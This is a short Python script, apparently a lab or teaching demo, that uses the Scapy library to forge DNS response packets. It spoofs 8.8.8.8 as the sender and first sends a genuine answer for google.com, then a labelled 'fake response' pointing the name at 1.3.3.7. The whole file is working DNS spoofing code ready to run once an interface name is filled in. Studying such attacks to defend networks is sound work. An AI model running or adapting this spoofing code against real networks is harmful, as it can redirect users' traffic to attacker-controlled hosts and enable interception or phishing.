from scapy.all import Ether, IP, UDP, DNS, DNSRR, sendp

MY_ADAPTER = "YOUR NETWORK INTERFACE NAME"
TRANS_ID = 1337

def send_dns_response(ip_answer):
    packet = (
        Ether() /
        IP(src="8.8.8.8", dst="192.168.0.1") /
        UDP(sport=53, dport=12345) /
        DNS(
            id=TRANS_ID,
            qr=1,          # 1 = ответ
            an=DNSRR(
                rrname="google.com.",
                type="A",
                rdata=ip_answer
            )
        )
    )
    sendp(packet, iface=MY_ADAPTER, verbose=True)

print("SEND THE REAL RESPONSE...")
send_dns_response("142.250.185.46")


print("SEND THE FAKE RESPONSE (DNS SPOOFING)...")
send_dns_response("1.3.3.7")